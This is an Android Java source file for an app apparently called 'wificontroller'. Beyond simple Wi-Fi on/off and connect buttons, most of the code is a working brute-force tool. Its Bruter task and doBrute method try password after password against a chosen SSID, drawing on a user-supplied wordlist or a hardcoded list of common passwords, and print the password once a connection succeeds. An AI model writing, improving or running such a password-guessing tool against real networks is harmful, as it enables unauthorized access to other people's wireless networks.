package com.example.user.wificontroller;

import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.net.wifi.*;
import android.content.Context;
import android.widget.EditText;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.List;



public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void enableWiFi(View view) {
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifi.setWifiEnabled(true);
    }

    public void disableWiFi(View view) {
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifi.setWifiEnabled(false);
    }

    //////////////BRUTE//////////////////
    class Bruter extends AsyncTask <Void, String, String> {
        TextView errorView = (TextView) findViewById(R.id.errorV);
        @Override
        protected String doInBackground(Void... args) {
            try {
                bruteWifi();
            } catch (InterruptedException e) {return null;}
            return null;
        }

        @Override
        protected void onProgressUpdate(String... progress) {
            if(errorView.getText().length()>=50)
                errorView.setText("");

            errorView.append(progress[0]);
        }

        @Override
        protected void onPostExecute(String res) {
            errorView.append(res);
        }

        boolean connectToUnknownB(WifiManager wifi, String ssid, String pass, boolean silent) throws InterruptedException {
            TextView errorView = (TextView) findViewById(R.id.errorV);
            wifi.setWifiEnabled(true);

            boolean isGood = false;
            WifiConfiguration wifiConf = new WifiConfiguration();
            wifiConf.SSID = ("\"" + ssid + "\"");
            if(!pass.equals(""))
                wifiConf.preSharedKey = ("\"" + pass + "\"");
            publishProgress("Trying pass: " + ("\"" + pass + "\"\r\n"));
            int res = wifi.addNetwork(wifiConf);
            if (!silent)
                publishProgress("add Network returned " + res + "\r\n");
            ///*
            wifi.disconnect();
            wifi.enableNetwork(res, true);
            wifi.reconnect();

            Thread.sleep(300);
            WifiInfo winf = wifi.getConnectionInfo();
            SupplicantState state;
            state = winf.getSupplicantState();

            if (state == SupplicantState.ASSOCIATING ||
                    state == SupplicantState.AUTHENTICATING ||
                    state == SupplicantState.GROUP_HANDSHAKE ||
                    state == SupplicantState.FOUR_WAY_HANDSHAKE ||
                    state == SupplicantState.SCANNING) {
                publishProgress("waiting\r\n");
                Thread.sleep(200);
            }
            Thread.sleep(200);
            if (state == SupplicantState.INVALID ||
                    state == SupplicantState.DISCONNECTED ||
                    state == SupplicantState.INACTIVE ||
                    state == SupplicantState.INTERFACE_DISABLED ||
                    state == SupplicantState.UNINITIALIZED ||
                    state == SupplicantState.ASSOCIATED ||
                    state == SupplicantState.DORMANT) {
                publishProgress("invalid\r\n");
                isGood = false;
            }

            if (state == SupplicantState.COMPLETED) {//COMPLETED - good
                publishProgress("Connected!\r\n");
                publishProgress(state.toString() + "\r\n");
                isGood = true;
            }
            //*/
            if (isGood){//connectToKnownWiFi(wifi, ssid, false)) {
                publishProgress("SSID: " + ssid + "\r\n");
                publishProgress("Password: " + pass + "\r\n");
                return true;
            } else {
                wifi.removeNetwork(res);
                return false;
            }
        }


        protected boolean bruteWifi() throws InterruptedException {
            WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            wifi.setWifiEnabled(true);

            EditText ssidEdit = (EditText) findViewById(R.id.ssid);
            EditText FilePathEdit = (EditText) findViewById(R.id.pathFile);
            EditText SpliterEdit = (EditText) findViewById(R.id.spliter);
            String ssid = ssidEdit.getText().toString();

            boolean res = false;
            String pathToFile = FilePathEdit.getText().toString();
            String spliter = null;
            spliter = SpliterEdit.getText().toString();

            boolean readFromDefault = true;
            String FilePassList[] = {};
            String DefaultPassList[] = {"00000000", "87654321", "12345678", "000000000", "123456789", "88888888", "888888888",
                    "99999999", "999999999", "qwertyui", "qwertyuio", "password", "qwertyuiop", "administrator", "superman",
                    "password1", "password12", "password123", "password1234", "password12345", "password123456", "baseball",
                    "football", "1234567890", "123123123", "0987654321", "gfhjkm", "1q2w3e4r5t6y", "q1w2e3r4t5y6", "baltika9",
                    "russia2018", "russia2019", "medvedev", "leningrad", "eskander"};
            try{
                String line;
                String data = "";
                BufferedReader br = new BufferedReader(new FileReader(pathToFile));
                if(spliter.equals("") || spliter == null) {//if spliter null - work
                    publishProgress("Spliter is emply!\r\nSpliting by new string\r\n");
                    while ((line = br.readLine()) != null) {
                        res = connectToUnknownB(wifi, ssid, line.trim(), true);
                        if (res)
                            return true;
                    }
                } else {
                    while ((line = br.readLine()) != null) {
                        data += line;
                    }
                }
                FilePassList = data.split(spliter);
                readFromDefault = false;
                br.close();

            } catch(Exception e) {
                readFromDefault = true;
                publishProgress("Cant read file!\r\n");

            } finally {
                if(readFromDefault) {
                    for (String i : DefaultPassList) {
                        res = connectToUnknownB(wifi, ssid, i, true);
                        if (res) {
                            publishProgress("Password: " + i + "\r\n");
                            return true;
                        }
                    }
                } else {
                    for (String i : FilePassList) {
                        res = connectToUnknownB(wifi, ssid, i, true);
                        if (res) {
                            publishProgress("Password: " + i + "\r\n");
                            return true;
                        }
                    }
                }
            }
            return false;
        }

    };
    public void bruteWiFi(View view) throws InterruptedException {
        //doBrute();
        Bruter task = new Bruter();
        task.execute();
        //Thread thread = new Thread(task);
        //thread.start();
        //task.run();
        //runOnUiThread(task);
        //Runnable task = (Runnable) doBrute(wifi);
        /*
        int pass_len = 8;
        String pass = "        ";//8 spaces
        char passChars[] = pass.toCharArray();
        for(int i = 0;i<pass_len;i++){
            while(passChars[i] <= 126){
                if(passChars[i] == 126){
                }
                i++;
            }
        }*/
    }

    public void doBrute() throws InterruptedException {
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifi.setWifiEnabled(true);

        TextView errorView = (TextView) findViewById(R.id.errorV);
        EditText ssidEdit = (EditText) findViewById(R.id.ssid);
        EditText FilePathEdit = (EditText) findViewById(R.id.pathFile);
        EditText SpliterEdit = (EditText) findViewById(R.id.spliter);
        String ssid = ssidEdit.getText().toString();

        boolean res = false;
        String pathToFile = FilePathEdit.getText().toString();
        String spliter = null;
        spliter = SpliterEdit.getText().toString();

        boolean readFromDefault = true;
        String FilePassList[] = {};
        String DefaultPassList[] = {"00000000", "87654321", "12345678", "000000000", "123456789", "88888888", "888888888",
                "99999999", "999999999", "qwertyui", "qwertyuio", "password", "qwertyuiop", "administrator", "superman",
                "password1", "password12", "password123", "password1234", "password12345", "password123456", "baseball",
                "football", "1234567890", "123123123", "0987654321", "gfhjkm", "1q2w3e4r5t6y", "q1w2e3r4t5y6", "baltika9",
                "russia2018", "russia2019", "medvedev", "leningrad", "eskander"};
        try{
            String line;
            String data = "";
            BufferedReader br = new BufferedReader(new FileReader(pathToFile));
            if(spliter.equals("") || spliter == null) {//if spliter null - work
                errorView.append("Spliter is emply!\r\nSpliting by new string\r\n");
                while ((line = br.readLine()) != null) {
                    res = connectToUnknown(wifi, ssid, line.trim(), true);
                    if (res)
                        return;
                }
            } else {
                while ((line = br.readLine()) != null) {
                    data += line;
                }
            }
            FilePassList = data.split(spliter);
            readFromDefault = false;
            br.close();

        } catch(Exception e) {
            readFromDefault = true;
            errorView.append("Cant read file!\r\n");

        } finally {
            if(readFromDefault) {
                for (String i : DefaultPassList) {
                    res = connectToUnknown(wifi, ssid, i, true);
                    if (res)
                        break;
                }
            } else {
                for (String i : FilePassList) {
                    res = connectToUnknown(wifi, ssid, i, true);
                    if (res)
                        break;
                }
            }
        }
    }
/////////////////////////////////////////////////////////////////////
    public void connect(View view) throws InterruptedException {
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifi.setWifiEnabled(true);
        EditText passEdit = (EditText) findViewById(R.id.pass);
        EditText ssidEdit = (EditText) findViewById(R.id.ssid);
        TextView errorView = (TextView) findViewById(R.id.errorV);

        String ssid = ssidEdit.getText().toString();
        String pass = passEdit.getText().toString();
        boolean knownConnectionSuccess = connectToKnownWiFi(wifi, ssid, false);
        if (!knownConnectionSuccess) {
            boolean isSuccess = connectToUnknown(wifi, ssid, pass, false);
            if (!isSuccess) {
                errorView.append("Error while connecting\r\n");
            } else if (isSuccess) {
                String conInfo[] = wifi.getConnectionInfo().toString().split(", ");
                for (String i : conInfo) {
                    errorView.append(i + "\r\n");
                }
            }
        } else if (knownConnectionSuccess) {
            String conInfo[] = wifi.getConnectionInfo().toString().split(", ");
            for (String i : conInfo) {
                errorView.append(i + "\r\n");
            }
        }
    }



    /*
    Connects to already known host by ssid.
    Returns true if success or false if not
    @param wifi
    @param ssid
     */

    boolean connectToKnownWiFi(WifiManager wifi, String ssid, boolean silent) throws InterruptedException {
        TextView errorView = (TextView) findViewById(R.id.errorV);
        wifi.setWifiEnabled(true);
        if(errorView.getText().length()>=50)
            errorView.setText("");

        List<WifiConfiguration> knownList = wifi.getConfiguredNetworks();

        for (WifiConfiguration i : knownList) {
            if (i.SSID != null && i.SSID.equals("\"" + ssid + "\"")) {
                wifi.disconnect();
                if (!silent)
                    errorView.append("Connecting to " + ("\"" + ssid + "\"\r\n"));

                boolean rs = wifi.enableNetwork(i.networkId, true);
                if (!silent)
                    errorView.append("Enable network returned:" + rs + "\r\n");

                rs = wifi.reconnect();
                if (!silent)
                    errorView.append("Reconnect returned:" + rs + "\r\n");
                Thread.sleep(100);
                WifiInfo winf = wifi.getConnectionInfo();
                SupplicantState state;
                state = winf.getSupplicantState();
                if (state == SupplicantState.ASSOCIATING ||
                        state == SupplicantState.AUTHENTICATING ||
                        state == SupplicantState.GROUP_HANDSHAKE ||
                        state == SupplicantState.FOUR_WAY_HANDSHAKE ||
                        state == SupplicantState.SCANNING) {
                        errorView.append("waiting\r\n");
                        Thread.sleep(200);
                }

                if (state == SupplicantState.INVALID ||
                        state == SupplicantState.DISCONNECTED ||
                        state == SupplicantState.INACTIVE ||
                        state == SupplicantState.INTERFACE_DISABLED ||
                        state == SupplicantState.UNINITIALIZED ||
                        state == SupplicantState.ASSOCIATED ||
                        state == SupplicantState.DORMANT) {
                    errorView.append("invalid\r\n");
                    return false;
                }

                if (state == SupplicantState.COMPLETED) {//COMPLETED - good
                    errorView.append("Connected!\r\n");
                    errorView.append(state.toString() + "\r\n");
                    return true;
                }
            }
        }
        return false;
    }



    /*
    Connects to unknown wifi.
    If success return true. Else returns false.
    @param wifi
    @param ssid
    @param pass
     */
    boolean connectToUnknown(WifiManager wifi, String ssid, String pass, boolean silent) throws InterruptedException {
        TextView errorView = (TextView) findViewById(R.id.errorV);
        wifi.setWifiEnabled(true);
        if(errorView.getText().length()>=50)
            errorView.setText("");
        boolean isGood = false;
        WifiConfiguration wifiConf = new WifiConfiguration();
        wifiConf.SSID = ("\"" + ssid + "\"");
        if(!pass.equals(""))
            wifiConf.preSharedKey = ("\"" + pass + "\"");
        errorView.append("Trying pass: " + ("\"" + pass + "\"\r\n"));
        int res = wifi.addNetwork(wifiConf);
        if (!silent)
            errorView.append("add Network returned " + res + "\r\n");
        ///*
        wifi.disconnect();
        wifi.enableNetwork(res, true);
        wifi.reconnect();

        Thread.sleep(300);
        WifiInfo winf = wifi.getConnectionInfo();
        SupplicantState state;
        state = winf.getSupplicantState();

        if (state == SupplicantState.ASSOCIATING ||
                state == SupplicantState.AUTHENTICATING ||
                state == SupplicantState.GROUP_HANDSHAKE ||
                state == SupplicantState.FOUR_WAY_HANDSHAKE ||
                state == SupplicantState.SCANNING) {
            errorView.append("waiting\r\n");
            Thread.sleep(200);
        }
        Thread.sleep(200);
        if (state == SupplicantState.INVALID ||
                state == SupplicantState.DISCONNECTED ||
                state == SupplicantState.INACTIVE ||
                state == SupplicantState.INTERFACE_DISABLED ||
                state == SupplicantState.UNINITIALIZED ||
                state == SupplicantState.ASSOCIATED ||
                state == SupplicantState.DORMANT) {
            errorView.append("invalid\r\n");
            isGood = false;
        }

        if (state == SupplicantState.COMPLETED) {//COMPLETED - good
            errorView.append("Connected!\r\n");
            errorView.append(state.toString() + "\r\n");
            isGood = true;
        }
        //*/
        if (isGood){//connectToKnownWiFi(wifi, ssid, false)) {
            errorView.append("SSID: " + ssid + "\r\n");
            errorView.append("Password: " + pass + "\r\n");
            return true;
        } else {
            wifi.removeNetwork(res);
            return false;
        }
    }
}